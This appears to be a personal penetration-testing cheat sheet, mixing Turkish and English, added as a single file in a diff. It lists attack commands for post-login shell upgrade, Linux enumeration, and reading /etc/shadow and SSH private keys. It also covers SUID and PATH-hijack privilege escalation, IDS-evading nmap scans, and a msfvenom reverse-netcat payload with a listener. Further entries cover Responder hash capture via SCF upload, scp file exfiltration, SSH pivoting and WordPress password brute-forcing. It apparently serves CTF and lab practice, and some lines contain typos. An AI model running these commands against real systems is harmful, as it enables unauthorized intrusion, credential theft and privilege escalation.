@@ -1,0 +1,299 @@
+--ACTIVATE SHELL & TERM AFTER LOGIN THE TARGET SYSTEM--
+python3 -c “import pty;pty.spawn('/bin/bash')”
+export TERM=xterm
+export TERM=xterm-256color
+stty raw -echo ; fg ; reset
+stty columns 200 rows 200
+
+--ENUMERATION--
+hostname
+uname -a
+/proc/version
+/etc/issue
+ps -A,ps aux,ps axjf
+ss -tulnp
+env=>ortam değişkenleri(environment variables)
+sudo -l
+id
+/etc/passwd  /etc/shadow
+history
+ifconfig
+ip route
+netstat -a=>all ,-ano
+netstat -s=>stats ,t=>tcp,u=>udp ,l=>listen ,i=>interfaces , -tp=>service and pid informations
+sudo -u #-1 /vi -->vi privesc
+
+/etc/crontab
+/etc/shadow
+/etc/sudoers.d
+/proc/version
+/etc/issue
+/etc/fstab
+/etc/resolv.conf-->(DNS logins.)Dns girişleri.
+mount
+cd /etc & ls -la
+/etc/exports=>no_root_squash varsa suid bitli dosya çalışabilir.(suidbit file is executable if no_root_squash in exports)
+SSH
+home/user/.ssh/id_rsa
+cd /var/www/html & ls & cat * | grep password & grep -i -R "pass" * & ls -la
+cat .bash_history
+cat /etc/hosts
+cd /etc/update-motd.d/--->basit ama etkili bir yöntemdir.(simple but effective method)
+cat .htaccess
+hidden files ./
+backup files
+cat config dosyaları
+getcap -r  2>/dev/null
+cd /var/tmp
+cd /dev/shm
+netstat -tulnp=>çalışan portlar(status of applications on ports)
+ps -aux => işlemler(processes)
+ps aux | grep -i ‘root’ --color=auto
+mount
+ls -la & dir -a
+
+443 port https ekle başına açıksa(if 443 port is open you can be use with https://$ip:443/)
+https://...
+dirsearch -u https://..
+
+/var/backup=>backuplar.(backups)
+/var/www/html/=>config dbler.(look at config files)
+
+crontab -l
+netstat -ano
+netstat -tulpn
+netstat -tplan
+rpcinfo -p
+ss -tupln
+ps -aux
+lsof -i :80 => 80 portunu kullananları getir.(what working on 80 port)
+getcap -r / 2>/dev/null (capabilities) yetenekler
+
+--FIND THE FILES-- (dosyaları bulmak)
+find / -writable -type d 2>/dev/null
+find . -name flag1.txt
+find /home -name flag1.txt
+find / -type d -name config
+find / -type f -perm 0777
+find / -perm a=x =>executable files
+find /home -user frank => find all files in frank user
+find / -size 50M =>find files under 50MB
+find / -size +100M -type f 2>/dev/null
+find / -perm -222 -type d 2>/dev/null
+find / -perm -o w -type d 2>/dev/null
+find / -perm -o x -type d 2>/dev/null
+find / -name perl*
+find / -name python*
+find / -name gcc*
+find / -perm -u=s -type f 2>/dev/null
+SUID=> find / -perm -04000 -type f -ls 2>/dev/null
+.bak,.php,.db,.log,.. files
+
+find / -perm -u=s -type f 2>/dev/null
+find / -perm /4000 -user root -exec ls -lh {} \;
+find / -perm -u=s -type f 2>/dev/null 
+eğer sticky bit nmap varsa nmap için(if nmap permission is vulnerable)
+/usr/local/bin/nmap --interactive -->ile girip nmapten !ls yazarsan root yetkisinde shell komut gider. (write this code after !ls you get the root shell)
+find / -gruop hannah -print 2>/dev/null
+find / -type f -readable 2>/dev/null | grep README.txt
+find /etc -name passwd -print 2>/dev/null
+find /etc jhonny passwd -print 2>/dev/null
+find / -perm /4000 2>/dev/null
+
+--And you can look at the all log files in system--(this locations may executable in path traversal vulnerable machines)
+some examples
+/var/log/httpd/error_log
+/var/log/apache2/error.log
+/var/log/httpd-error.log
+/var/log/httpd/access_log
+/var/log/apache2/access.log
+/var/log/httpd-access.log
+/var/log/auth.log
+
+To find exact apache log file location, you can use grep command:
+
+ # grep ErrorLog /usr/local/etc/apache22/httpd.conf
+
+ # grep ErrorLog /etc/apache2/apache2.conf
+
+ # grep ErrorLog /etc/httpd/conf/httpd.conf
+ 
+ # grep CustomLog /usr/local/etc/apache22/httpd.conf
+
+ # grep CustomLog /etc/apache2/apache2.conf
+
+ # grep CustomLog /etc/httpd/conf/httpd.conf
+
+--ENUMERATION TOOLS--(scripts)
+LinPeas LES=>Linux Exploit Suggester
+LinEnum LSE=>Linux Smart Enumaration
+LPC=>Linux Priv Checker
+pspy64.exe
+
+--EXPORT PATH--(bash to root) => PRIVESC METHOD
+export PATH=/tmp:$PATH => (if /tmp directory is vulnerable) "bash to root"
+
+cd /tmp
+echo ‘/bin/bash’ > bashroot
+chmod +x bashroot
+export PATH=/tmp:$PATH
+echo $PATH=>control
+./bashroot=>root
+
+--NMAP BASH SCRIPT--
+for i in {1..65535};do (echo > /dev/tcp/$ip/$i) > /dev/null 2>&1 && echo $;is open;done ⇒ ideal tarama (nmap with bash script on target)
+for port in {1..65535}; do echo > /dev/tcp/$ip/$port && echo "$port open"; done 2>/dev/null
+for i in {1..254}; do (ping -c 1 xxx.xx.x.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
+
+--NMAP & NIKTO--
+nmap -Pn -v target_ip
+nmap -Pn -v target_ip -sV -sC
+nmap -Pn -v -O target_ip
+nmap -Pn -p- -A target_ip (or) -p1-65535   && --min-rate 5000' veya '-T5 İLE HIZLANDIRABİLİRİZ.
+nmap -sT --top-ports 1000 target_ip (or) -sU
+nmap -sn targetip-255 => açık makinaları bulur.(find the open machines)
+nmap ip --script vuln -p 21
+
+/usr/share/nmap/scripts=> .nse dosyaları (.nse files)
+telnet + ip + port => banner yakalama (capture the banner)
+
+nikto -h target_ip
+
+nfs 2049-->--script nfs-ls.nse / nfs-showmount.nse / nfs-startfs.nse => locate *.nse | grep nfs
+ftp portuna anonim giriş -->nmap ip --script ftp-anon -p 21 (anonymous login inf 21 ftp port)
+smb portuna script nmapi yapmakiçin--> nmap --script=smb-vuln-ms* -p 445 ipadresi.hedefin (scan with smb script in --script parameter)
+445 port açıksa porta yönelik nmap scripti taraması yapar.(scanning nmap if 445 port is open on target)
+
+HEDEFTE İDS VARSA (ids targets)
+nmap -f -t 0 -n  -Pn -data-length 200 -D targetip,102,103,104 adreslerinden ids atlatılır. (ids bypass)
+
+nmap ip --script http-waf-detect -p 80 => 80 http portuna güvenlik duvarı taraması yapar (firewall scan)
+nmap ip --script http-waf-fingerprint -p 80 => güvenlik duvarının adını verir. (get the firewall name)
+
+nmap -p- 65535 -T4 -A -v $ip (full scan for all ports)
+
+nano /etc/hosts
+önce ip sonra domain adresi yazılır. (write first ipaddress then domainname server)
+$ip  kb.vuln ($ip example= 192.168.x.x or 10.0.x.x)
+
+netdiscover -r $ip/16 -->aynı networkte arama (scan same network)
+
+/usr/share/nmap/scripts
+KATEGORILER(categories)
+auth=Kimlik doğrulama (authentication)
+broadcast=Yayın mesajlarını iletip ana bilgisayar bulur (send broadcast messajes and find main computer)
+brute=Grişlere kaba kuvvet saldırısı (bruteforce)
+default=Varsayılan -sC (default -sC)
+discovery=Database ve dns adlarını alır (discovery dns names and database names)
+dos=Servis dışı bırakma saldırıları (denial of service)
+exploit=Savunmasız hizmetlerden yararlanma (exploit to vulnerable services)
+external=Geoplugin ve virüstotal kullanır (use geoplugin and virustotal)
+fuzzer=Saldırı (fuzzing)
+intrusive=Brute ve exploit gibi müdahaleci komut dosyaları (brute and exploit files)
+malware=Backdoor için tarar (scan for backdoor)
+safe=Hedefi çökertmeyen güvenli komut dosyaları (safe scan)
+version=Hizmet sürümlerini alır (get version)
+vuln=Güvenlik açıklarını yalakar ve yararlanır. (get the vulnerabilities)
+Kullanımı => --script “http-date” (get the date of http)
+
+nmap -sV -p 445 --script smb-vuln-ms17-010 ipadress veya(or) --script vuln veya --script smb-vuln* (find cve on target)
+
+mousepad usr/share/nmap/scripts/smb-vuln-ms17-010 =>içine bakabiliriz scriptin (we can see script files in /nmap/scripts location)
+
+./nmap -sn targetip-255 -oN scan.txt=>açık makineleri bulur (find all open machines on target)
+./nmap -sS target_ip -oN 1.txt (get the output for nmap scan on target)
+
+--SCAN NMAP SCAN WITH NC--
+nc -zv ip 1-65535=>hedefte çalışır => (working on target)
+
+--SSH--22
+ssh USERNAME@$ip -p 60022=>ssh portu değişikse. (login 60022 port ssh)
+chmod 600 id_rsa
+ssh -i id_rsa user@ip
+scp -P 65111 USERNAME@$ip:/home/username/.remote_secret   .remote_secret => (get the file from target ssh)
+ssh USERNAME@$ip -t “bash –noprofile”
+export PATH=/bin:/usr/bin:$PATH
+export SHELL=/bin/bash:$SHELL
+ssh USERNAME@$ip -p 65111 -L 5901:localhost:5901 => ssh port forwarding
+
+METERPRETER PİVOTİNG
+run autoroute -s ip.0/24
+run autoroute -p -->look.
+
+DİREKT YÖNLENDİRME => ssh -L 8000:IP:80 user@targetip -fN => (directly forwarding)
+
+PROXY YÖNLENDİRME DİNAMİC => ssh -D 1337 user@targetip -fN => (with proxy dynamic)
+
+REMOTE => ssh -R 80:127.0.0.1:8000 user@targetip -fN
+
+--TELNET--23
+telnet + ip
+telnette msfvenom ile dosya çalıştırma (execute file with msfvenom on telnet)
+msfvenom -p cmd/unix/reverse_netcat lhost=lokal lport=port R (payload upload and run scenario)
+.RUN ile exploiti karşıda telnette çalıştır => (.run exploitable file worked on target system)
+nc -lvnp 4444 (local port listening)
+
+--FTP--21
+Anonymosu Login:id=Anonymous pw=Anonymous
+ftp + targetip + target port
+
+--SMB--139,445
+139 445 smb
+smb üzerinden anonim giriş dene. => (try anonymous login first on smb)
+smbclient //targetip/anonymous
+şifre yazmadan devam default girer. => (no password and login)
+
+smbget -R smb://targetip/anonymous--->dosyayı çekti => (get the smb files)
+
+smbclient -L targetip
+dosya adında dolar işareti varsa şifreyle korunmadıgı anlamına geliyor. ($files=unprotected file)
+smbclient //targetip/Files
+
+enum4linux -a ip => bilgiler,kullanıcılar,erişilen dosyalar => (info,users,accessibility files)
+
+smbmap + ip => dizinlere erişimler (okuma ve yazma) => (acces the directories"read or write mode")
+smbmap -H ip => hedefte paylaşılan dizinler => (shared directories on target system)
+
+--upload scf file and use responder to get hash--(scenario)
+smb scf file attack=>upload et => (this scenario is scf file upload to target system)
+lokalde responder hash yakala => (capture hash with responder on local)
+responder -wrf -v -I tun0 
+scfyi yükleyince hash düşer. => (when scf uploaded on target system get the hash from target)
+
+
+smbclient //ip/directory -U suit -p 445 => (login smb 445 with suit username)
+
+smbclient -L ////targetip// -U Administrator
+
+--NFS--2049
+showmount -e ip
+mkdir /Desktop/mounted
+mount ip:/foldername /home/kali/Desktop/mounted
+cd /Desktop/mounted & ls => karşı nfsdeki dosyalara erişir. => (access the nfs files from target)
+
+mkdir /tmp/mount
+mount -t nfs ip:/folderordirectory /tmp/mount -nolock
+
+/usr/sbin/showmount -e ip
+
+--MYSQL--
+mysql -h ip -u root -p
+şifre girilir.=>(password login)
+show databases;
+use previse; => (previse is database name)
+show tables;
+describe files;
+select protected from *
+select name,protected from files;
+select * from accounts where id = 1;
+select TO_BASE64(password) from accounts where id = 1;
+
+--NC SCAN ON TARGET--
+nc -zv targetip 1-65535
+
+--WPSCAN--
+wpscan --url targetip/blog -e u -t 50 -P /usr/share/wordlists/rockyou.txt
+
+wpscan --url targetip/blog --plugins-detection aggressive
+
+wpscan --url ip -e u -->sayfalardan kullanıcı adı bulunabilir. => (find usernames on webpages)
